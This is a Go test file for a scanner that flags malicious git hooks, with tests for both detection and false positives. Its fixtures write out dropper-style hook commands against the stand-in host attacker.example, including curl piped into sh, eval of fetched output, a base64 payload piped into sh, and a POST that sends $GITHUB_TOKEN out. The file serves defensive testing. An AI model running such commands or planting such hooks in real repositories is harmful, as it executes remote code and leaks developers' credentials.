package main

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestValidateHookContent_FlagsCurlPipeShell verifies the load-bearing
// pattern — curl|sh — gets detected. This is the most common shape for
// dropper hooks.
func TestValidateHookContent_FlagsCurlPipeShell(t *testing.T) {
	bad := `#!/bin/sh
# pre-commit hook
curl -sSL https://attacker.example/payload.sh | sh
`
	warns := validateHookContent([]byte(bad))
	require.NotEmpty(t, warns)
	assert.Contains(t, warns[0], "pipes downloaded content into a shell")
}

func TestValidateHookContent_FlagsCommandSubstitution(t *testing.T) {
	bad := `#!/bin/sh
TOKEN=$(curl -sS https://attacker.example/token)
echo $TOKEN > /tmp/leak
`
	warns := validateHookContent([]byte(bad))
	require.NotEmpty(t, warns)
}

func TestValidateHookContent_FlagsEvalSubstitution(t *testing.T) {
	bad := `#!/bin/sh
eval $(curl -sSL https://attacker.example/cmd)
`
	warns := validateHookContent([]byte(bad))
	require.NotEmpty(t, warns)
	// Both eval and curl-substitution patterns will fire; just confirm any did.
}

func TestValidateHookContent_FlagsBase64PipeShell(t *testing.T) {
	bad := "#!/bin/sh\necho 'aW1wb3J0IG9zCm9zLnN5c3RlbSgnY3VybCBhdHRhY2tlci5leGFtcGxlJyk=' | base64 -d | sh\n"
	warns := validateHookContent([]byte(bad))
	require.NotEmpty(t, warns)
}

func TestValidateHookContent_FlagsAuthHeaderInCurl(t *testing.T) {
	bad := `#!/bin/sh
curl -X POST -H "Authorization: Bearer $GITHUB_TOKEN" https://attacker.example/leak
`
	warns := validateHookContent([]byte(bad))
	require.NotEmpty(t, warns)
}

// TestValidateHookContent_AllowsLegitHooks verifies that normal hook
// content doesn't false-positive. Each of these is a typical pattern in
// real-world hooks.
func TestValidateHookContent_AllowsLegitHooks(t *testing.T) {
	good := []string{
		"#!/bin/sh\nox hooks commit-msg \"$@\"\n",
		"#!/bin/sh\n# call ox for prepare-commit-msg\nexec ox hooks prepare-commit-msg \"$@\"\n",
		"#!/bin/bash\ngit describe --tags --always\n",
		"#!/bin/sh\n# format check\ngofmt -l . || exit 1\n",
		"#!/bin/sh\n# python lint\npython -c \"import sys; print(sys.version)\"\n", // short -c, allowed
		"#!/bin/sh\n# legitimate curl with output processing\ncurl -s https://api.example.com/version > /tmp/v\n",
	}
	for _, s := range good {
		t.Run(s[:min(40, len(s))], func(t *testing.T) {
			warns := validateHookContent([]byte(s))
			assert.Empty(t, warns, "false positive on: %q (warnings: %v)", s, warns)
		})
	}
}

// TestValidateInstalledHooks_FindsByPath plants a known-bad hook and
// asserts the walker surfaces it with the right relative path.
func TestValidateInstalledHooks_FindsByPath(t *testing.T) {
	root := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(root, ".git", "hooks"), 0755))
	hookPath := filepath.Join(root, ".git", "hooks", "pre-commit")
	bad := "#!/bin/sh\ncurl -sSL https://attacker.example/x | sh\n"
	require.NoError(t, os.WriteFile(hookPath, []byte(bad), 0755))

	findings, err := validateInstalledHooks(root)
	require.NoError(t, err)
	require.Len(t, findings, 1)
	assert.Equal(t, ".git/hooks/pre-commit", findings[0].Path)
	assert.NotEmpty(t, findings[0].Warnings)
}

// TestValidateInstalledHooks_SkipsSampleHooks verifies that .sample files
// (shipped by git itself) are not scanned — they'd produce noise on every
// clean repo.
func TestValidateInstalledHooks_SkipsSampleHooks(t *testing.T) {
	root := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(root, ".git", "hooks"), 0755))
	bad := "#!/bin/sh\ncurl -sSL https://attacker.example/x | sh\n"
	require.NoError(t, os.WriteFile(filepath.Join(root, ".git", "hooks", "pre-commit.sample"),
		[]byte(bad), 0755))

	findings, err := validateInstalledHooks(root)
	require.NoError(t, err)
	assert.Empty(t, findings)
}

// TestValidateInstalledHooks_NoGitRoot is a guard against nil-pointer
// panics in code paths invoked outside a repo.
func TestValidateInstalledHooks_NoGitRoot(t *testing.T) {
	findings, err := validateInstalledHooks("")
	require.NoError(t, err)
	assert.Empty(t, findings)
}
